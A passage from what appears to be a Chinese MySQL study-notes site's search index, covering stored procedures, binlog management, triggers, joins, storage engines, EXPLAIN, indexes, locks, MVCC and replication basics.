-- 条件开始 WHEN 1 THEN SELECT '输入为1'; WHEN 0 THEN SELECT '输入为0'; ELSE SELECT '不是1也不是0'; END CASE; -- 条件结束 END$$ DELIMITER; 循环语句 WHILE 类似于其他语言的while: DELIMITER $$ CREATE PROCEDURE demo6(IN num INT,OUT SUM INT) BEGIN SET SUM = 0; WHILE num<10 DO -- 循环开始 SET num = num+1; SET SUM = SUM+num; END WHILE; -- 循环结束 END$$ DELIMITER; 调用: -- 调用函数 CALL demo6(0,@sum); -- 查询函数 SELECT @sum; 循环语句 REPEAT UNTLL REPEATE…UNTLL 语句的用法和 Java中的 do…while 语句类似， 都是先执行循环操作，再判断条件， 区别是REPEATE 表达式值为 false时才执行循环操作，直到表达式值为 true停止: -- 创建过程 DELIMITER $$ CREATE PROCEDURE demo7(IN num INT,OUT SUM INT) BEGIN SET SUM = 0; REPEAT-- 循环开始 SET num = num+1; SET SUM = SUM+num ; UNTIL num>=10 END REPEAT; -- 循环结束 END$$ DELIMITER; 调用: CALL demo7(9,@sum); SELECT @sum; 循环语句 LOOP 循环语句，用来重复执行某些语句。 执行过程中可使用 LEAVE语句或者ITEREATE来跳出循环，也可以嵌套IF等判断语句。 LEAVE 语句效果对于Java中的break，用来终止循环； ITERATE语句效果相当于Java中的continue，用来跳过此次循环。进入下一次循环。且ITERATE之下的语句将不在进行。 例如: DELIMITER $$ CREATE PROCEDURE demo8(IN num INT,OUT SUM INT) BEGIN SET SUM = 0; demo_sum:LOOP-- 循环开始 SET num = num+1; IF num > 10 THEN LEAVE demo_sum; -- 结束此次循环 ELSEIF num <= 9 THEN ITERATE demo_sum; -- 跳过此次循环 END IF; SET SUM = SUM+num; END LOOP demo_sum; -- 循环结束 END$$ DELIMITER; 使用存储过程插入信息: DELIMITER $$ CREATE PROCEDURE demo9(IN s_student VARCHAR(10),IN s_sex CHAR(1),OUT s_result VARCHAR(20)) BEGIN -- 声明一个变量 用来决定这个名字是否已经存在 DECLARE s_count INT DEFAULT 0; -- 验证这么名字是否已经存在 SELECT COUNT(*) INTO s_count FROM student WHERE `name` = s_student; IF s_count = 0 THEN INSERT INTO student (`name`, sex) VALUES(s_student, s_sex); SET s_result = '数据添加成功'; ELSE SET s_result = '名字已存在，不能添加'; SELECT s_result; END IF; END$$ DELIMITER; 参考: MySQL中的存储过程（详细篇） 更多详情: MySQL 存储过程","tags":"数据库","url":"/yq-doc-source-docs-database-mysql-Conceptual-foundation-Stored-procedure.html","loc":"/yq-doc-source-docs-database-mysql-Conceptual-foundation-Stored-procedure.html"},{"title":"binlog","text":"binlog是Mysql sever层维护的一种二进制日志， 与innodb引擎中的redo/undo log是完全不同的日志； 其主要是用来记录对mysql数据更新或潜在发生更新的SQL语句，并以\"事务\"的形式保存在磁盘中； 作用主要有： 复制：MySQL Replication在Master端开启binlog， Master把它的二进制日志传递给slaves并回放来达到master-slave数据一致的目的 数据恢复：通过mysqlbinlog工具恢复数据 增量备份 Binlog 包括两类文件： 二进制日志索引文件(.index)：记录所有的二进制文件。 二进制日志文件(.00000*)：记录所有 DDL 和 DML 语句事件。 redo log 保证一致性（将修改后的数据记录，当前语句） undo log 保证原子性（将修改前的数据记录，与当前语句相反的语句） binlog的清除/不记录 不记录 在 配置文件的 mysqld 下写入 skip-log-bin 清除 手动清理 , 查看主从库使用的是哪个binlog文件: show master status; show slave status; 删除之前可以先做个备份 清除指定日期的备份: purge master logs before '2016-09-01 17:20:00'; //删除指定日期以前的日志索引中binlog日志文件 或者: purge master logs to'mysql-bin.000022'; //删除指定日志文件的日志索引中binlog日志文件 注解 使用该语法，会将对应的文件和mysql-bin.index中对应路径删除 时间和文件名一定不可以写错，尤其是时间中的年和文件名中的序号， 以防不小心将正在使用的binlog删除！！！切勿删除正在使用的binlog reset master:将删除日志索引文件中记录的所有binlog文件，创建一个新的日志文件，起始值从000001开始。不要轻易使用该命令，这个命令通常仅仅用于第一次用于搭建主从关系的时的主库。 reset slave:清除master.info文件、relay-log.info文件，以及所有的relay log文件,并重新启用一个新的relaylog文件 自动清理 设置binlog过期时间，使系统自动删除binlog文件 在mysql中修改 , 查看binlog过期时间，这个值默认是0天，也就是说不自动清理，可以根据生产情况修改，本例修改为7天: mysql> show variables like 'expire_logs_days'; +------------------------+-------+ | Variable_name | Value | +------------------------+-------+ | expire_logs_days | 0 | +------------------------+-------+ mysql> set global expire_logs_days = 7; #设置binlog多少天过期 设置之后不会立即清除，触发条件是以下之一： binlog大小超过max_binlog_size，max_binlog_size默认为1G 手动执行flush logs 如果binlog非常多，不要轻易设置该参数，有可能导致IO争用，这个时候可以使用purge命令予以清除： 将bin.000055之前的binlog清掉: mysql>purge binary logs to 'bin.000055'; 将指定时间之前的binlog清掉: mysql>purge binary logs before '2017-05-01 13:09:51'; 配置文件中修改 mysqld在每个二进制日志名后面添加一个数字扩展名。 每次你启动服务器或刷新日志时该数字则增加。 如果当前日志大小达到max_binlog_size,还会自动创建新的二进制日志。 如果你正使用大的事务，二进制日志还会超过max_binlog_size:事务全写入一个二进制日志中，绝对不要写入不同的二进制日志中。 expire_logs_days 定义了mysql清除过期日志的时间。默认值为0,表示\"没有自动删除\"。 max_binlog_size 二进制日志最大大小，如果二进制日志写入的内容超出给定值，日志就会发生滚动。 你不能将该变量设置为大于1GB或小于4096字节。 默认值是1GB。 在my.cnf中添加配置,设置过期时间为30天: expire_logs_days = 30 max_binlog_size使用默认值即可 注解 过期时间设置的要适当，对于主从复制，要看从库的延迟决定过期时间， 避免主库binlog还未传到从库便因过期而删除，导致主从不一致！！！","tags":"数据库","url":"/yq-doc-source-docs-database-mysql-Conceptual-foundation-binlog.html","loc":"/yq-doc-source-docs-database-mysql-Conceptual-foundation-binlog.html"},{"title":"触发器","text":"MySQL数据库中触发器是一个特殊的存储过程， 不同的是执行存储过程要使用 CALL 语句来调用， 而触发器的执行不需要使用 CALL 语句来调用，也不需要手工启动， 只要一个预定义的事件发生就会被 MySQL自动调用。 引发触发器执行的事件一般如下： 增加一条学生记录时，会自动检查年龄是否符合范围要求。 每当删除一条学生信息时，自动删除其成绩表上的对应记录。 每当删除一条数据时，在数据库存档表中保留一个备份副本。 触发程序的优点如下： 触发程序的执行是自动的，当对触发程序相关表的数据做出相应的修改后立即执行。 触发程序可以通过数据库中相关的表层叠修改另外的表。 触发程序可以实施比 FOREIGN KEY 约束、CHECK 约束更为复杂的检查和操作。 触发器与表关系密切，主要用于保护表中的数据。 特别是当有多个表具有一定的相互联系的时候，触发器能够让不同的表保持数据的一致性。 在 MySQL 中，只有执行 INSERT、UPDATE 和 DELETE 操作时才能激活触发器。 在实际使用中，MySQL 所支持的触发器有三种： INSERT 触发器 UPDATE 触发器 DELETE 触发器 INSERT 触发器 在 INSERT 语句执行之前或之后响应的触发器。 使用 INSERT 触发器需要注意以下几点： 在 INSERT 触发器代码内，可引用一个名为 NEW（不区分大小写）的虚拟表来访问被插入的行。 在 BEFORE INSERT 触发器中，NEW 中的值也可以被更新，即允许更改被插入的值（只要具有对应的操作权限）。 对于 AUTO_INCREMENT 列，NEW 在 INSERT 执行之前包含的值是 0，在 INSERT 执行之后将包含新的自动生成值。 UPDATE 触发器 在 UPDATE 语句执行之前或之后响应的触发器。 使用 UPDATE 触发器需要注意以下几点： 在 UPDATE 触发器代码内，可引用一个名为 NEW（不区分大小写）的虚拟表来访问更新的值。 在 UPDATE 触发器代码内，可引用一个名为 OLD（不区分大小写）的虚拟表来访问 UPDATE 语句执行前的值。 在 BEFORE UPDATE 触发器中，NEW 中的值可能也被更新，即允许更改将要用于 UPDATE 语句中的值（只要具有对应的操作权限）。 OLD 中的值全部是只读的，不能被更新。 注解 当触发器设计对触发表自身的更新操作时，只能使用 BEFORE 类型的触发器，AFTER 类型的触发器将不被允许。 DELETE 触发器 在 DELETE 语句执行之前或之后响应的触发器。 使用 DELETE 触发器需要注意以下几点： 在 DELETE 触发器代码内，可以引用一个名为 OLD（不区分大小写）的虚拟表来访问被删除的行。 OLD 中的值全部是只读的，不能被更新。 总体来说，触发器使用的过程中，MySQL 会按照以下方式来处理错误。 若对于事务性表，如果触发程序失败，以及由此导致的整个语句失败，那么该语句所执行的所有更改将回滚； 对于非事务性表，则不能执行此类回滚，即使语句失败，失败之前所做的任何更改依然有效。 若 BEFORE 触发程序失败，则 MySQL 将不执行相应行上的操作。 若在 BEFORE 或 AFTER 触发程序的执行过程中出现错误，则将导致调用触发程序的整个语句失败。 仅当 BEFORE 触发程序和行操作均已被成功执行，MySQL 才会执行AFTER触发程序。 触发器的执行顺序 我们建立的数据库一般都是 InnoDB 数据库，其上建立的表是事务性表，也就是事务安全的。 这时，若SQL语句或触发器执行失败，MySQL 会回滚事务，有： 如果 BEFORE 触发器执行失败，SQL 无法正确执行 SQL 执行失败时，AFTER 型触发器不会触发 AFTER 类型的触发器执行失败，SQL 会回滚 MySQL创建触发器（CREATE TRIGGER） 触发器是与 MySQL数据表有关的数据库对象，在满足定义条件时触发，并执行触发器中定义的语句集合。 触发器的这种特性可以协助应用在数据库端确保数据的完整性。 基本语法 在 MySQL 5.7 中，可以使用 CREATE TRIGGER 语句创建触发器。 语法格式如下: CREATE <触发器名> < BEFORE | AFTER > <INSERT | UPDATE | DELETE > ON <表名> FOR EACH Row<触发器主体> 语法说明如下 触发器名 触发器的名称，触发器在当前数据库中必须具有唯一的名称。 如果要在某个特定数据库中创建，名称前面应该加上数据库的名称。 INSERT | UPDATE | DELETE 触发事件，用于指定激活触发器的语句的种类。 注意：三种触发器的执行时间如下。 INSERT：将新行插入表时激活触发器。 例如，INSERT 的 BEFORE 触发器不仅能被 MySQL 的 INSERT 语句激活，也能被 LOAD DATA 语句激活。 DELETE： 从表中删除某一行数据时激活触发器，例如 DELETE 和 REPLACE 语句。 UPDATE：更改表中某一行数据时激活触发器，例如 UPDATE 语句。 BEFORE | AFTER BEFORE 和 AFTER，触发器被触发的时刻，表示触发器是在激活它的语句之前或之后触发。 若希望验证新数据是否满足条件，则使用 BEFORE 选项； 若希望在激活触发器的语句执行之后完成几个或更多的改变，则通常使用 AFTER 选项。 表名 与触发器相关联的表名，此表必须是永久性表，不能将触发器与临时表或视图关联起来。 在该表上触发事件发生时才会激活触发器。 同一个表不能拥有两个具有相同触发时刻和事件的触发器。 例如，对于一张数据表，不能同时有两个 BEFORE UPDATE 触发器， 但可以有一个 BEFORE UPDATE 触发器和一个 BEFORE INSERT 触发器， 或一个 BEFORE UPDATE 触发器和一个 AFTER UPDATE 触发器。 触发器主体 触发器动作主体，包含触发器激活时将要执行的 MySQL 语句。 如果要执行多个语句，可使用 BEGIN…END 复合语句结构。 FOR EACH ROW 一般是指行级触发，对于受触发事件影响的每一行都要激活触发器的动作。 例如，使用 INSERT 语句向某个表中插入多行数据时，触发器会对每一行数据的插入都执行相应的触发器动作。 注解 每个表都支持 INSERT、UPDATE 和 DELETE 的 BEFORE 与 AFTER，因此每个表最多支持 6 个触发器。 每个表的每个事件每次只允许有一个触发器。单一触发器不能与多个事件或多个表关联。 另外，在 MySQL 中，若需要 查看数据库中已有的触发器，则可以使用 SHOW TRIGGERS 语句。 注解 如果触发器的逻辑块只包含一个语句，您可以省略 BEGIN 和 END 关键字。 创建 BEFORE 类型触发器 以, t1表为例: mysql> show create table t1 \\G; *************************** 1. row *************************** Table: t1 Create Table: CREATE TABLE `t1` ( `id` int NOT NULL, `name` varchar(255) DEFAULT NULL, `age` int DEFAULT NULL, `birth` datetime DEFAULT NULL, PRIMARY KEY (`id`) ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci 1 row in set (0.00 sec) ERROR: No query specified 关于此表创建可见 TableCreate , 后续用例都以此表操作. 查看表信息: mysql> desc t1; +-------+--------------+------+-----+---------+-------+ | Field | Type | Null | Key | Default | Extra | +-------+--------------+------+-----+---------+-------+ | id | int | NO | PRI | NULL | | | name | varchar(255) | YES | | NULL | | | age | int | YES | | NULL | | | birth | datetime | YES | | NULL | | +-------+--------------+------+-----+---------+-------+ 4 rows in set (0.00 sec) 创建一个触发器, 在插入表之前, 统计计算下人数, 总年龄, 平均年龄: mysql> delimiter $$ mysql> create trigger AvgAge -> before insert -> on t1 -> for each row -> begin -> set @nums = @nums + 1; -> set @sumAge = @sumAge + new.age; -> set @sumAvgAge = @sumAge / @nums; -> end $$ Query OK, 0 rows affected (0.02 sec) mysql> delimiter ; mysql> 使用, 需要先定义一下变量: mysql> set @nums=0, @sumAge=0, @sumAvgAge=0; Query OK, 0 rows affected (0.00 sec) mysql> insert into t1 -> values -> (1, \"bob\", 26, \"1999-2-2\"), -> (2, \"tom\", 28, \"1998-4-4\"); Query OK, 2 rows affected (0.01 sec) Records: 2 Duplicates: 0 Warnings: 0 mysql> select @nums, @sumAge, @sumAvgAge; +-------+---------+--------------+ | @nums | @sumAge | @sumAvgAge | +-------+---------+--------------+ | 2 | 54 | 27.000000000 | +-------+---------+--------------+ 1 row in set (0.00 sec) 创建 AFTER 类型触发器 MySQL修改和删除触发器（DROP TRIGGER） 修改触发器可以通过删除原触发器，再以相同的名称创建新的触发器。 基本语法 与其他MySQL数据库对象一样，可以使用 DROP 语句将触发器从数据库中删除。 语法格式如下: DROP TRIGGER [ IF EXISTS ] [数据库名] <触发器名> 语法说明如下： 触发器名 要删除的触发器名称。 数据库名 可选项。指定触发器所在的数据库的名称。若没有指定，则为当前默认的数据库 权限 执行 DROP TRIGGER 语句需要 SUPER 权限。 IF EXISTS 可选项。避免在没有触发器的情况下删除触发器。 注解 删除一个表的同时，也会自动删除该表上的触发器。 另外，触发器不能更新或覆盖，为了修改一个触发器，必须先删除它，再重新创建。 删除触发器 使用 DROP TRIGGER 语句可以删除 MySQL 中已经定义的触发器。 参考: MySQL 之触发器（创建/修改、删除CREATE/DROP TRIGGER)","tags":"数据库","url":"/yq-doc-source-docs-database-mysql-Conceptual-foundation-trigger.html","loc":"/yq-doc-source-docs-database-mysql-Conceptual-foundation-trigger.html"},{"title":"表内外连接","text":"假设有两个表a, b: CREATE TABLE `a_table` ( `a_id` int(11) DEFAULT NULL, `a_name` varchar(10) DEFAULT NULL, `a_part` varchar(10) DEFAULT NULL ) ENGINE=InnoDB DEFAULT CHARSET=utf8 CREATE TABLE `b_table` ( `b_id` int(11) DEFAULT NULL, `b_name` varchar(10) DEFAULT NULL, `b_part` varchar(10) DEFAULT NULL ) ENGINE=InnoDB DEFAULT CHARSET=utf8 表数据 内连接 内连接, 语法: inner join on 用例: select * from a_table a inner join b_table b on a.a_id = b.b_id; 结果 说明: 结果只会包含满足 a.a_id = b.b_id. 相当于两个表的交集. 左连接（左外连接） 语法: left join on / left outer join on 用例: select * from a_table a left join b_table b on a.a_id = b.b_id; 结果 left join 是left outer join的简写，它的全称是左外连接，是外连接中的一种 左连接会显示主表（左表）的全部记录，右表只会显示符合连接条件的数据，不符合的为null 右连接（右外连接） 关键字: right join on / right outer join on 语句: select * from a_table a right outer join b_table b on a.a_id = b.b_id; 执行结果 right join是right outer join的简写，它的全称是右外连接，是外连接中的一种。 与左(外)连接相反，右(外)连接，显示右表（主表）所有记录，左表只会显示符合连接条件的数据，不符合的为null 全外连接(mysql不支持) 关键字: full [outer] join 相当于返回两个表的并集, 没有的为空 MySQL暂不支持这种语句，不过可以使用union将两个结果集\"堆一起\"， 利用左连接，右连接分两次将数据取出，然后用union将数据合并去重。 参考:: MySQL多表查询与左连接、右连接、内连接、全连接 【MySQL】连接查询 以及 on、where、Having的区别 UNION 这个不属于连接, 不过容易混, 所以放在这 合并多个结果集为一个 MySQL UNION 操作符用于连接两个以上的 SELECT 语句的结果组合到一个结果集合，并去除重复的行。 UNION 操作符必须由两个或多个 SELECT 语句组成，每个 SELECT 语句的列数和对应位置的数据类型必须相同: SELECT column1, column2, ... FROM table1 WHERE condition1 UNION SELECT column1, column2, ... FROM table2 WHERE condition2 [ORDER BY column1, column2, ...]; 参数说明: column1, column2, ... 是你要选择的列的名称，如果使用 * 表示选择所有列。 table1, table2, ... 是你要从中查询数据的表的名称。 condition1, condition2, ... 是每个 SELECT 语句的过滤条件，是可选的。 ORDER BY 子句是一个可选的子句，用于指定合并后的结果集的排序顺序。 将选择客户表和供应商表中所有城市的唯一值，并按城市名称升序排序: SELECT city FROM customers UNION SELECT city FROM suppliers ORDER BY city; 还有个 UNION ALL , 也是合并结果集, 但是不会去重. 总结 UNION 语句：用于将不同表中相同列中查询的数据展示出来；（不包括重复数据） UNION ALL 语句：用于将不同表中相同列中查询的数据展示出来；（包括重复数据） 使用形式如下:: SELECT 列名称 FROM 表名称 UNION SELECT 列名称 FROM 表名称 ORDER BY 列名称； SELECT 列名称 FROM 表名称 UNION ALL SELECT 列名称 FROM 表名称 ORDER BY 列名称；","tags":"数据库","url":"/yq-doc-source-docs-database-mysql-Connection-inside-and-outside-the-table.html","loc":"/yq-doc-source-docs-database-mysql-Connection-inside-and-outside-the-table.html"},{"title":"数据库引擎","text":"MyISAM引擎 数据库表存储文件分成三类: table_name.frm 表结构 table_name.MYI 表索引 table_name.MYD 表数据 即索引文件和数据文件是分离的(非聚集) 索引的叶子结点存储的是数据的地址 InnoDB 数据库表存储文件分成两类: table_name.frm 表结构 (8.0统一放到系统表的idb里面了貌似) table_name.idb 表索引和数据 即索引文件和数据文件是 聚集 的 索引的叶子结点存储的是数据本身(聚集索引包含完整的数据记录) 通常说的聚集索引就是指的这个 .idb 非主键索引存储的是主键索引 , 为了保持一致性与节省空间. 所以从非主键索引查询, 还是会回表查主键找数据. 一些常见问题 为什么 InnoDB 建议必须建主键, 且建议使用整型的 自增主键 ? 以下原因: InnoDB 会有一个聚集索引, 如果不建主键, 数据库自己也会维护一个不可见的主键列(叫row_id, 不然没法建B+树), 因为不可见, 开发者自己也没法用, 所以还不如自己建 使用自增主键, 主要是为了减小增加数据时候, 索引B+树会进行一个扩充, 如果不是自增, 会有B+树插入的额外开销, 浪费数据库性能 自增主键使用整型, 是因为比较是最快的且占空间较小. 如果是UUID, 每一位都要比","tags":"数据库","url":"/yq-doc-source-docs-database-mysql-Database-engine.html","loc":"/yq-doc-source-docs-database-mysql-Database-engine.html"},{"title":"explain 优化","text":"explain 查询优化神器 EXPLAIN语句的基本语法如下: explain select select_option select_options是SELECT语句的查询选项，包括FROM WHERE子句等 输出结果列选项含义: id SELECT识别符. 这是SELECT的查询序列号, 表示查询中执行select子句或操作表的顺序, id相同，执行顺序从上到下, id不同，id值越大执行优先级越高; select_type 表示SELECT语句的类型. 它可以是以下几种取值： SIMPLE:表示简单查询，其中不包括连接查询和子查询； PRIMARY:表示主查询，或者是最外层的查询语句，最外层查询为PRIMARY，也就是最后加载的就是PRIMARY； UNION:表示连接查询的第2个或后面的查询语句， 不依赖于外部查询的结果集 DEPENDENT UNION:连接查询中的第2个或后面的SELECT语句，依赖于外面的查询； UNION RESULT:连接查询的结果； SUBQUERY:子查询中的第1个SELECT语句；不依赖于外部查询的结果集 DEPENDENT SUBQUERY:子查询中的第1个SELECT，依赖于外面的查询； DERIVED:导出表的SELECT（FROM子句的子查询）,MySQL会递归执行这些子查询，把结果放在临时表里。 DEPENDENT DERIVED:派生表依赖于另一个表 MATERIALIZED:物化子查询 UNCACHEABLE SUBQUERY:子查询，其结果无法缓存，必须针对外部查询的每一行重新进行评估 UNCACHEABLE UNION:UNION中的第二个或随后的 select 查询，属于不可缓存的子查询 table 表示查询的表 partitions 查询将从中匹配记录的分区。该值适用NULL于未分区的表 type 表示表的连接类型 system: 该表是仅有一行的系统表。这是const连接类型的一个特例 const: 数据表最多只有一个匹配行，它将在查询开始时被读取，并在余下的查询优化中作为常量对待。 const表查询速度很快，因为只读取一次,const用于使用常数值比较PRIMARY KEY或UNIQUE索引的所有部分的场合。 eq_ref:对于每个来自前面的表的行组合，从该表中读取一行, 可以用于使用=运算符进行比较的索引列 . 比较值可以是常量，也可以是使用在此表之前读取的表中列的表达式 ref:对于来自前面的表的任意行组合，将从该表中读取所有匹配的行，ref可以用于使用\"＝\"或\"＜＝＞\"操作符的带索引的列。 fulltext:使用FULLTEXT 索引执行联接 ref_or_null:这种连接类型类似于ref，但是除了MySQL还会额外搜索包含NULL值的行。此联接类型优化最常用于解析子查询 index_merge:此联接类型指示使用索引合并优化。在这种情况下，key输出行中的列包含使用的索引列表，并key_len包含使用的索引 的最长键部分的列表 unique_subquery:类型替换 以下形式的eq_ref某些 IN子查询,unique_subquery 只是一个索引查找函数，它完全替代了子查询以提高效率。 index_subquery:连接类型类似于 unique_subquery。它代替IN子查询,但只适合子查询中的非唯一索引 range:只检索给定范围的行，使用一个索引来选择行。key列显示使用了哪个索引。key_len包含所使用索引的最长关键元素。当使用＝、＜＞、＞、＞＝、＜、＜＝、IS NULL、＜＝＞、BETWEEN或者IN操作符用常量比较关键字列时，类型为range index:该index联接类型是一样的 ALL，只是索引树被扫描。这发生两种方式：1、如果索引是查询的覆盖索引，并且可用于满足表中所需的所有数据，则仅扫描索引树。在这种情况下，Extra列显示为 Using index，2、使用对索引的读取执行全表扫描，以按索引顺序查找数据行。 Uses index没有出现在 Extra列中。 ALL:对于前面的表的任意行组合进行完整的表扫描 possible_keys 指出MySQL能使用哪个索引在该表中找到行. 若该列是NULL，则没有相关的索引. 在这种情况下，可以通过检查WHERE子句看它是否引用某些列或适合索引的列来提高查询性能. 如果是这样，可以创建适合的索引来提高查询的性能。 kye 表示查询实际使用的索引，如果没有选择索引，该列的值是NULL. 要想强制MySQL使用或忽视possible_keys列中的索引，在查询中使用FORCE INDEX、USE INDEX或者IGNORE INDEX key_len 表示MySQL选择的索引字段按字节计算的长度，若键是NULL，则长度为NULL. 注意，通过key_len值可以确定MySQL将实际使用一个多列索引中的几个字段 ref 表示使用哪个列或常数与索引一起来查询记录。 rows 显示MySQL在表中进行查询时必须检查的行数。 Extra 表示MySQL在处理查询时的详细信息 参考: MySQL索引原理及慢查询优化","tags":"数据库","url":"/yq-doc-source-docs-database-mysql-Explain-optimization.html","loc":"/yq-doc-source-docs-database-mysql-Explain-optimization.html"},{"title":"索引数据结构","text":"B+树 Mysql索引采取的是 B+树 , 可参考 /docs/数据结构/树 对于 B+树 , 每个节点的每一个索引值, 只有到达叶子节点时候, 才会有当前对应的行数据 (非叶子节点不存储data, 只放索引, 可以放更多的索引) 索引值可重复, 但是行数据只有叶子节点才有 叶子节点包含所有索引 叶子节点间用指针相邻连接(提高区间访问性能) 一般每一个索引节点的数据会放满一页, 一般是 16KB 查询每一页大小: show GLOBAL_STATUS like 'Innodb_page_size' Hash 在Mysql表中新建索引时, 还可选择索引类型为 Hash表 </docs/数据结构/Hash> , 对于单查询时非常快的 但是只支持 = , IN , 不支持范围查询, 且需要处理Hash冲突 FULL TEXT","tags":"数据库","url":"/yq-doc-source-docs-database-mysql-Indexing-data-structure.html","loc":"/yq-doc-source-docs-database-mysql-Indexing-data-structure.html"},{"title":"锁","text":"锁粒度 行级锁 表级锁 页级锁 性能 乐观锁 悲观锁 是否独占 读锁(共享锁), 阻塞写 写锁(排他锁), 阻塞读写 意向锁(Intention Lock) 其他锁 间隙锁(Gap Lock) 临键锁(Next-key Locks)","tags":"数据库","url":"/yq-doc-source-docs-database-mysql-Lock.html","loc":"/yq-doc-source-docs-database-mysql-Lock.html"},{"title":"MVCC","text":"MVCC，即Multi-Version Concurrency Control （多版本并发控制）。 它是一种并发控制的方法，一般在数据库管理系统中， 实现对数据库的并发访问，在编程语言中实现事务内存: 通俗的讲，数据库中同时存在多个版本的数据， 并不是整个数据库的多个版本，而是某一条记录的多个版本同时存在， 在某个事务对其进行操作的时候，需要查看这一条记录的隐藏列事务版本id， 比对事务id并根据事物隔离级别去判断读取哪个版本的数据。 隔离级别见: /docs/数据库/mysql/事务 数据库隔离级别读已提交、可重复读 都是基于MVCC实现的， 相对于加锁简单粗暴的方式，它用更好的方式去处理读写冲突，能有效提高数据库并发性能。 事务版本号 事务每次开启前，都会从数据库获得一个自增长的事务ID， 可以从事务ID判断事务的执行先后顺序。这就是事务版本号。 隐式字段 对于InnoDB存储引擎，每一行记录都有两个隐藏列trx_id、roll_pointer， 如果表中没有主键和非NULL唯一键时，则还会有第三个隐藏的主键列row_id。 列名 是否必须 描述 row_id 否 单调递增的行ID，不是必需的，占用6个字节 trx_id 是 记录操作该数据事务的事务ID roll_pointer 是 这个隐藏列就相当于一个指针，指向回滚段的undo日志 undo log undo log，回滚日志，用于记录数据被修改前的信息。 在表记录修改之前，会先把数据拷贝到undo log里， 如果事务回滚，即可以通过undo log来还原数据。 可以这样认为，当delete一条记录时， undo log 中会记录一条对应的insert记录， 当update一条记录时，它记录一条对应相反的update记录。 undo log有什么用途呢？ 事务回滚时，保证原子性和一致性。 用于MVCC快照读。 版本链 多个事务并行操作某一行数据时，不同事务对该行数据的修改会产生多个版本， 然后通过回滚指针（roll_pointer），连成一个链表，这个链表就称为版本链。 如下： 其实，通过版本链，我们就可以看出事务版本号、表格隐藏的列和undo log它们之间的关系。 我们再来小分析一下。 假设现在有一张core_user表，表里面有一条数据,id为1，名字为孙权 现在开启一个事务A: 对core_user表执行update core_user set name =\"曹操\" where id=1,会进行如下流程操作 首先获得一个事务ID=100 把core_user表修改前的数据,拷贝到undo log 修改core_user表中，id=1的数据，名字改为曹操 把修改后的数据事务Id=101改成当前事务版本号，并把roll_pointer指向undo log数据地址。 快照读和当前读 快照读 读取的是记录数据的可见版本（有旧的版本）。 不加锁,普通的select语句都是快照读, 如: select * from core_user where id > 2; 当前读 读取的是记录数据的最新版本， 显式加锁的都是当前读: select * from core_user where id > 2 for update; select * from account where id>2 lock in share mode; Read View Read View是什么呢？ 它就是事务执行SQL语句时，产生的读视图。 实际上在innodb中，每个SQL语句执行前都会得到一个Read View。 Read View有什么用呢？ 它主要是用来做可见性判断的，即判断当前事务可见哪个版本的数据 Read View是如何保证可见性判断的呢？我们先看看Read view 的几个重要属性 m_ids 当前系统中那些活跃(未提交)的读写事务ID, 它数据结构为一个List。 min_limit_id 表示在生成ReadView时，当前系统中活跃的读写事务中最小的事务id，即m_ids中的最小值。 max_limit_id 表示生成ReadView时，系统中应该分配给下一个事务的id值。 creator_trx_id 创建当前read view的事务ID Read view 匹配条件规则如下： 如果数据事务ID trx_id < min_limit_id ，表明生成该版本的事务在生成Read View前， 已经提交(因为事务ID是递增的)，所以该版本可以被当前事务访问。 如果 trx_id >= max_limit_id ，表明生成该版本的事务在生成ReadView后才生成，所以该版本不可以被当前事务访问。 如果 min_limit_id =<trx_id< max_limit_id , 需腰分3种情况讨论 如果m_ids包含trx_id,则代表Read View生成时刻，这个事务还未提交， 但是如果数据的trx_id等于creator_trx_id的话，表明数据是自己生成的，因此是可见的。 如果m_ids包含trx_id，并且trx_id不等于creator_trx_id，则 Read View生成时， 事务未提交，并且不是自己生产的，所以当前事务也是看不见的； 如果m_ids不包含trx_id，则说明你这个事务在Read View生成之前就已经提交了，修改的结果，当前事务是能看见的。 MVCC实现原理分析 查询一条记录，基于MVCC，是怎样的流程 获取事务自己的版本号，即事务ID 获取Read View 查询得到的数据，然后Read View中的事务版本号进行比较。 如果不符合Read View的可见性规则， 即就需要Undo log中历史快照; 最后返回符合规则的数据 InnoDB 实现MVCC，是通过 Read View + Undo Log 实现的， Undo Log 保存了历史快照，Read View可见性规则帮助判断当前版本的数据是否可见。 读已提交（RC）隔离级别，存在不可重复读问题的分析历程 创建core_user表，插入一条初始化数据,如下 隔离级别设置为读已提交（RC），事务A和事务B同时对core_user表进行查询和修改操作: 事务A: select * fom core_user where id=1 事务B: update core_user set name =\"曹操\" 执行流程如下： 最后事务A查询到的结果是，name=曹操的记录，我们基于MVCC， 来分析一下执行流程： A开启事务，首先得到一个事务ID为100 B开启事务，得到事务ID为101 事务A生成一个Read View，read view对应的值如下 变量 值 m_ids 100，101 max_limit_id 102 min_limit_id 100 creator_trx_id 100 然后回到版本链：开始从版本链中挑选可见的记录 由图可以看出，最新版本的列name的内容是孙权， 该版本的trx_id值为100。开始执行read view可见性规则校验: min_limit_id(100)=<trx_id（100）<102; creator_trx_id = trx_id =100; 由此可得，trx_id=100的这个记录，当前事务是可见的。所以查到是name为孙权的记录。 事务B进行修改操作，把名字改为曹操。 把原数据拷贝到undo log,然后对数据进行修改， 标记事务ID和上一个数据版本在undo log的地址。 提交事务 事务A再次执行查询操作，新生成一个Read View，Read View对应的值如下 变量 值 m_ids 100 max_limit_id 102 min_limit_id 100 creator_trx_id 100 然后再次回到版本链：从版本链中挑选可见的记录： 从图可得，最新版本的列name的内容是曹操，该版本的trx_id值为101。开始执行Read View可见性规则校验: min_limit_id(100)=<trx_id（101）<max_limit_id（102); 但是,trx_id=101，不属于m_ids集合 因此，trx_id=101这个记录，对于当前事务是可见的。所以SQL查询到的是name为曹操的记录。 综上所述，在读已提交（RC）隔离级别下，同一个事务里，两个相同的查询，读取同一条记录（id=1）， 却返回了不同的数据（第一次查出来是孙权，第二次查出来是曹操那条记录），因此RC隔离级别，存在不可重复读并发问题。 参考: https://juejin.cn/post/7016165148020703246","tags":"数据库","url":"/yq-doc-source-docs-database-mysql-MVCC.html","loc":"/yq-doc-source-docs-database-mysql-MVCC.html"},{"title":"主从同步","text":"用处: 比如使用 主从架构 (binlog) 实现 读写分离 业务代码层面, 读写分离只关注路由到读的库, 还是写的库. 出了物理上的从库, 还可以使用其他组件 比如 ClickHouse 伪装作为从库(还是用的binlog的形式实现, 单机读性能强), 还有 Canal 与 MQ 结合 主从复制原理 流程 master数据写入，更新binlog master创建一个dump线程向slave推送binlog slave连接到master的时候，会创建一个IO线程接收binlog，并记录到 relay log(中继日志) 中 slave再开启一个sq|线程读取 relay log 事件并在slave执行，完成同步 slave记录自己的binglog 主从同步延迟处理 